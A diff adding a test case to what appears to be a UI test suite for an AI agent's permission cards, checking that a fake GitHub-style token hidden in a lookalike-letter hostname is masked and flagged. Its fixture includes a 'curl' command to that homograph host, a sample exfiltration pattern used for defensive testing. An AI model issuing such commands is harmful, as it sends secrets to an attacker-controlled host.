@@ -129,6 +129,20 @@ module.exports = async (ctx) => {
     } finally {
       await js(`window.DurbarLookalike=window.__lookSaved;0`);
     }
+    // fix round 2 (#1300 re-review): a token masked inside a host: no part of it on the card, its line, the announcement, the card's text or the tooltip
+    const G = 'ghp' + '_' + 'Q7'.repeat(18), PARTS = /ghp_|Q7Q7|7Q7Q/;
+    for (const [rid, kind, summary, host] of [['look-h-' + w, 'url', 'fetch https://еx-' + G + '-y.invalid/', 'еx-' + G + '-y.invalid'], ['look-hs-' + w, 'shell', 'run curl https://еx-' + G + '-y.invalid/', '']]) {
+      await js(`window.__ann=[];0`);
+      const extra = kind === 'url' ? { scopeKey: 'url:' + new URL('https://' + host + '/').host, scopeLabel: 'fetch ' + new URL('https://' + host + '/').host } : { scopeKey: 'shell-exact:' + summary.slice(4), scopeLabel: 'run ' + summary.slice(4, 31) + '…' };
+      await ask(rid, kind, summary, extra);
+      assert.ok(await until(`!!document.querySelector('#chat .note.perm.pending .plook')`, 8000), `${w}: ${kind}: a token in a host: the line`);
+      await until(`window.__ann.length>0`, 3000);
+      const seen = await js(`(()=>{const n=[...document.querySelectorAll('#chat .note.perm.pending')].pop();return {card:n.textContent,line:n.querySelector('.plook').textContent,titles:[...n.querySelectorAll('button')].map(b=>b.title+' '+b.textContent+' '+(b.getAttribute('aria-label')||'')).join(' '),req:window.__durbarSimUi.requestText(n.textContent),ann:window.__ann.join(' ')};})()`);
+      for (const [where, text] of Object.entries(seen)) assert.ok(!PARTS.test(text), `${w}: ${kind}: no part of the masked token in the ${where}: ${text}`);
+      assert.ok(seen.line.includes('There are lookalike letters in the hidden part too.'), `${w}: ${kind}: the hidden part is said: ${seen.line}`);
+      allEnabled(await card(), kind + ' token in a host');
+      await deny();
+    }
     // a clean card has no lookalike line
     await ask('look-c-' + w, 'shell', 'run npm test', { scopeKey: 'shell-exact:npm test', scopeLabel: 'run npm test' });
     assert.ok(await until(`!!document.querySelector('#chat .note.perm.pending .note-actions')`, 8000), `${w}: the clean card`);
